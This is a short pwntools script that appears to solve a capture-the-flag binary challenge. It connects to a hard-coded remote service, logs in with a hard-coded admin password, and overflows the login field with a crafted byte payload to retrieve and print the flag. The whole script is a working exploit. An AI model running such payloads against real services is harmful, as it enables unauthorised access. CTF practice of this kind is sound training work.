from pwn import *

io = remote('62.173.140.174', 17100)
#exe = context.binary = ELF('task2_file')
#io = exe.process()
io.recvuntil(b'Your choice: ')
io.sendline(b'1')
io.sendlineafter(b'Enter your login: ', b'admin')
io.sendlineafter(b'Enter your password: ', b'Super_secret_admin_password')

io.recvuntil(b'Your choice: ')
io.sendline(b'3')
#gdb.attach(io)
payload = b'ABDC' * 0xa + b'BDCBBDC'
io.sendlineafter(b'Enter your new login: ', payload)
io.recvuntil(b'Your choice: ')
io.sendline(b'2')
io.recvuntil(b'Your flag: ')
print(io.recvline())